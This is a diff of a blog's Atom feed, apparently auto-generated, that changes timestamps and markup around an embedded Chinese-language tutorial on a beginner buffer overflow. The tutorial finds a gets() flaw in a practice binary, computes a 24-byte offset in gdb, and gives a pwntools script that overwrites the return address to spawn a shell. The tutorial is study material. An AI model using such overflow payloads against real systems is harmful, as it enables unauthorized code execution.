@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-06-27T15:42:51.848Z</updated>
+  <updated>2019-06-27T15:47:09.014Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,18 +21,27 @@
     <link href="http://yoursite.com/2019/06/27/ROP/"/>
     <id>http://yoursite.com/2019/06/27/ROP/</id>
     <published>2019-06-27T07:22:47.707Z</published>
-    <updated>2019-06-27T15:42:51.848Z</updated>
+    <updated>2019-06-27T15:47:09.014Z</updated>
     
-    <content type="html"><![CDATA[<p>﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿—<br>date: 2019-06-27</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a><strong>ROP</strong></h2><hr><p>ROP全称为Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。</p><p>三步走</p><ol><li><strong>寻找漏洞点</strong></li><li><strong>寻找偏移量</strong><br>3.<strong>填入目标函数</strong> </li></ol><p><em><strong>gdb</strong></em></p><p>基础命令：</p><p>Start:启动或者重启进程</p><p>Step(si):执行下一条语句,如果该语句为函数调用,则进入函数</p><p>Next(ni):执行下一条语句,如果该语句为函数调用,不会进入函数内部执行</p><p>Continue(c):继续程序的运行,直到遇到下一个断点</p><p>Break(b):下断</p><p>–more–</p><p>打开<strong>main.c</strong></p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBf5f3d4666737e1a81444605cd00d6d12?method=download&shareKey=c81e33a72d2651c4de364d0a7ab96d58" alt="1"></p><p>发现gets存在漏洞（可以无限输入）</p><p><strong>gdb main</strong></p><p><strong>start</strong></p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBa9562b8a226fbe3d15ad528e51c2c273?method=download&shareKey=1b44dcfe1261734c113065a92d012811" alt="2"></p><p>进入gets函数里</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB3331f705e1c18fb38301f7ec746edbeb?method=download&shareKey=e87ae2103c85e4b0c896dc0a0f8c09e4" alt="3"></p><p>输入<strong>pattc 30</strong></p><p>获取长度为30的字符串</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB987ae7bcea4233077d133b44695268c6?method=download&shareKey=1e1cee45c46504e452ea61bc9de73e4b" alt="4"></p><p>覆盖之后输入<strong>patto (AAD</strong>  获取offset=24</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB913453e72bd0ff97cd8c181bd2101144?method=download&shareKey=81994459ab6469323641846f9b1c90b9" alt="5"></p><p>退出gdb，输入<strong>objdump -d main &gt; obj</strong></p><p><strong>cat obj</strong></p><p>找到sh的偏移量为：0x4005b6</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB8c31b03a957a10a852c65a4be5050af1?method=download&shareKey=1e74df5cfeb989c5cfd76629ed74d452" alt="6"></p><p>写python脚本</p><pre><code>from pwn import *p=process(&quot;./main&quot;)offset=24sh=0x4005b6payload=&quot;a&quot;*offset+p64(sh)gdb.attach(p)p.sendline(payload)p.interactive()</code></pre><p>最后运行程序 即成功</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBda276fd0a98cd9190075082610afa46a?method=download&shareKey=bb0ed18cb1382d8a8fadec1b64c337f5" alt="7"></p>]]></content>
+    <content type="html"><![CDATA[<p>﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿—<br>date: 2019-06-27</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a><strong>ROP</strong></h2><hr><p>ROP全称为Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。</p><p>三步走</p><ol><li><strong>寻找漏洞点</strong></li><li><strong>寻找偏移量</strong><br>3.<strong>填入目标函数</strong> </li></ol><p><em><strong>gdb</strong></em></p><p>基础命令：</p><p>Start:启动或者重启进程</p><p>Step(si):执行下一条语句,如果该语句为函数调用,则进入函数</p><p>Next(ni):执行下一条语句,如果该语句为函数调用,不会进入函数内部执行</p><p>Continue(c):继续程序的运行,直到遇到下一个断点</p><p>Break(b):下断</p><a id="more"></a><p>打开<strong>main.c</strong></p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBf5f3d4666737e1a81444605cd00d6d12?method=download&shareKey=c81e33a72d2651c4de364d0a7ab96d58" alt="1"></p><p>发现gets存在漏洞（可以无限输入）</p><p><strong>gdb main</strong></p><p><strong>start</strong></p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBa9562b8a226fbe3d15ad528e51c2c273?method=download&shareKey=1b44dcfe1261734c113065a92d012811" alt="2"></p><p>进入gets函数里</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB3331f705e1c18fb38301f7ec746edbeb?method=download&shareKey=e87ae2103c85e4b0c896dc0a0f8c09e4" alt="3"></p><p>输入<strong>pattc 30</strong></p><p>获取长度为30的字符串</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB987ae7bcea4233077d133b44695268c6?method=download&shareKey=1e1cee45c46504e452ea61bc9de73e4b" alt="4"></p><p>覆盖之后输入<strong>patto (AAD</strong>  获取offset=24</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB913453e72bd0ff97cd8c181bd2101144?method=download&shareKey=81994459ab6469323641846f9b1c90b9" alt="5"></p><p>退出gdb，输入<strong>objdump -d main &gt; obj</strong></p><p><strong>cat obj</strong></p><p>找到sh的偏移量为：0x4005b6</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB8c31b03a957a10a852c65a4be5050af1?method=download&shareKey=1e74df5cfeb989c5cfd76629ed74d452" alt="6"></p><p>写python脚本</p><pre><code>from pwn import *p=process(&quot;./main&quot;)offset=24sh=0x4005b6payload=&quot;a&quot;*offset+p64(sh)gdb.attach(p)p.sendline(payload)p.interactive()</code></pre><p>最后运行程序 即成功</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBda276fd0a98cd9190075082610afa46a?method=download&shareKey=bb0ed18cb1382d8a8fadec1b64c337f5" alt="7"></p>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿—&lt;br&gt;date: 2019-06-27&lt;/p&gt;
+      &lt;p&gt;﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿—&lt;br&gt;date: 2019-06-27&lt;/p&gt;
 &lt;h2 id=&quot;ROP&quot;&gt;&lt;a href=&quot;#ROP&quot; class=&quot;headerlink&quot; title=&quot;ROP&quot;&gt;&lt;/a&gt;&lt;strong&gt;ROP&lt;/strong&gt;&lt;/h2&gt;&lt;hr&gt;
-&lt;p&gt;ROP全
-      
+&lt;p&gt;ROP全称为Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。&lt;/p&gt;
+&lt;p&gt;三步走&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;寻找漏洞点&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;寻找偏移量&lt;/strong&gt;&lt;br&gt;3.&lt;strong&gt;填入目标函数&lt;/strong&gt; &lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;gdb&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;基础命令：&lt;/p&gt;
+&lt;p&gt;Start:启动或者重启进程&lt;/p&gt;
+&lt;p&gt;Step(si):执行下一条语句,如果该语句为函数调用,则进入函数&lt;/p&gt;
+&lt;p&gt;Next(ni):执行下一条语句,如果该语句为函数调用,不会进入函数内部执行&lt;/p&gt;
+&lt;p&gt;Continue(c):继续程序的运行,直到遇到下一个断点&lt;/p&gt;
+&lt;p&gt;Break(b):下断&lt;/p&gt;
     
     </summary>
     
